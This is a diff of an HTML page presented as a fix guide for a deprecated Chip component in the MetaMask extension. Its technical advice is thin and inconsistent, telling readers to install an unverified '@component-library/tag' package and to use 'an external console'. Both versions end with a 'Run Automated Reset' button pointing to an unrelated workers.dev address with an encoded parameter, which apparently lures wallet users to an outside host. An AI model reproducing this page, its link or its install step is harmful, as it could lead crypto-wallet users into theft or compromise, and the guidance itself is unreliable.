@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Extension Replace Deprecated Chip Component With Tag F</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #1a1a24;
+        font-family: BlinkMacSystemFont;
+        background: #0f111a;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: none;
+        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #00adb5; }
+    a { color: #ff7b2c; }
     .btn {
         background: #00adb5;
         color: #000;
@@ -45,27 +45,27 @@
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs because the Chip component used in the Metamask extension is no longer supported and has been replaced by the Tag component in the component-library, which is a part of the ETH ecosystem's efforts to improve and standardize its UI components.</li>
+<li>The error occurs because the Chip component is no longer supported and has been replaced by the Tag component, which provides more flexibility and customization options.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
 <li>Update the import statement to use the Tag component instead of Chip: </li>
 <li>Replace <code>import { Chip } from '@material-ui/core';</code> with <code>import { Tag } from '@component-library/tag';</code></li>
 <li>Update the component usage to match the new Tag component API</li>
-<li>Verify that the new component is properly styled and functional</li>
+<li>Remove any deprecated Chip component props to ensure compatibility</li>
 </ul>
 <div class="codehilite"><pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>@component-library/tag
 </code></pre></div>
 
-<p>Consider using an external console to verify the package installation. </p>
+<p>Consider utilizing an external console for further debugging and package management.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Node.js and npm installed on the system</li>
-<li>Metamask extension source code accessible for modification</li>
-<li>Familiarity with the component-library and its usage in the ETH ecosystem</li>
+<li>Node.js (version 16 or higher) installed on the system</li>
+<li>npm (version 8 or higher) installed on the system</li>
+<li>Metamask extension source code accessible for modifications</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
-    <a href="https://system-edge-router.aaronjungs.workers.dev?p=ZXRo" class="btn">🛠 Run Automated Reset</a>
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
